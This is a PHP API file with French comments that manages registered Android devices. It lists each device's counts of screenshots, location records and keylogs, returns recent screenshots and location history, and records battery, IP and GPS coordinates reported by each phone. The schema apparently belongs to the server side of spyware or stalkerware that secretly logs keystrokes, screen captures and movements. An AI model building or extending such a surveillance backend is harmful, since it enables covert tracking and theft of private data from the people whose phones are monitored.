<?php
/**
 * API Gestion des appareils
 */

require_once '../config.php';
$user = checkApiKey($pdo);

$method = $_SERVER['REQUEST_METHOD'];
$device_id = $_GET['device_id'] ?? '';

// ============================================
// GET - Liste des appareils
// ============================================
if ($method === 'GET' && !$device_id) {
    $stmt = $pdo->prepare("
        SELECT d.*, 
               (SELECT COUNT(*) FROM screenshots WHERE device_id = d.id) as screenshots,
               (SELECT COUNT(*) FROM locations WHERE device_id = d.id) as locations,
               (SELECT COUNT(*) FROM keylogs WHERE device_id = d.id) as keylogs
        FROM devices d
        WHERE d.user_id = ?
        ORDER BY d.last_seen DESC
    ");
    $stmt->execute([$user['id']]);
    $devices = $stmt->fetchAll();
    
    foreach ($devices as &$d) {
        $d['online'] = $d['last_seen'] && (time() - strtotime($d['last_seen'])) < 60;
    }
    
    sendJson(['devices' => $devices]);
}

// ============================================
// GET - Détails d'un appareil
// ============================================
if ($method === 'GET' && $device_id) {
    $stmt = $pdo->prepare("
        SELECT * FROM devices 
        WHERE device_id = ? AND user_id = ?
    ");
    $stmt->execute([$device_id, $user['id']]);
    $device = $stmt->fetch();
    
    if (!$device) {
        sendError('Appareil non trouvé', 404);
    }
    
    // Récupérer les dernières données
    $stmt = $pdo->prepare("
        SELECT * FROM screenshots 
        WHERE device_id = ? 
        ORDER BY captured_at DESC LIMIT 10
    ");
    $stmt->execute([$device['id']]);
    $screenshots = $stmt->fetchAll();
    
    $stmt = $pdo->prepare("
        SELECT * FROM locations 
        WHERE device_id = ? 
        ORDER BY timestamp DESC LIMIT 100
    ");
    $stmt->execute([$device['id']]);
    $locations = $stmt->fetchAll();
    
    $device['screenshots'] = $screenshots;
    $device['locations'] = $locations;
    $device['online'] = $device['last_seen'] && (time() - strtotime($device['last_seen'])) < 60;
    
    sendJson(['device' => $device]);
}

// ============================================
// POST - Enregistrer un appareil
// ============================================
if ($method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $device_id = $input['device_id'] ?? '';
    $device_name = $input['device_name'] ?? 'Android Device';
    $manufacturer = $input['manufacturer'] ?? '';
    $model = $input['model'] ?? '';
    $android_version = $input['android_version'] ?? '';
    $sdk_version = $input['sdk'] ?? 0;
    
    $stmt = $pdo->prepare("
        INSERT INTO devices (user_id, device_id, device_name, manufacturer, model, 
                            android_version, sdk_version, last_seen, is_online)
        VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), 1)
        ON DUPLICATE KEY UPDATE
            device_name = VALUES(device_name),
            manufacturer = VALUES(manufacturer),
            model = VALUES(model),
            android_version = VALUES(android_version),
            sdk_version = VALUES(sdk_version),
            last_seen = NOW(),
            is_online = 1
    ");
    
    if ($stmt->execute([
        $user['id'], $device_id, $device_name, $manufacturer, $model,
        $android_version, $sdk_version
    ])) {
        
        // Mettre à jour le compteur
        $pdo->prepare("UPDATE users SET devices_count = devices_count + 1 WHERE id = ?")
            ->execute([$user['id']]);
        
        logActivity($pdo, $user['id'], $pdo->lastInsertId(), 'device_registered', $device_id);
        
        sendJson(['success' => true]);
    } else {
        sendError('Erreur lors de l\'enregistrement', 500);
    }
}

// ============================================
// PUT - Mettre à jour le statut
// ============================================
if ($method === 'PUT') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $stmt = $pdo->prepare("
        UPDATE devices 
        SET last_seen = NOW(), 
            is_online = ?,
            battery_level = ?,
            network_type = ?,
            ip_address = ?,
            latitude = ?,
            longitude = ?
        WHERE device_id = ? AND user_id = ?
    ");
    
    $stmt->execute([
        $input['online'] ?? 1,
        $input['battery'] ?? null,
        $input['network'] ?? null,
        $_SERVER['REMOTE_ADDR'] ?? null,
        $input['lat'] ?? null,
        $input['lng'] ?? null,
        $_GET['device_id'],
        $user['id']
    ]);
    
    sendJson(['success' => true]);
}

sendError('Méthode non autorisée', 405);
?>
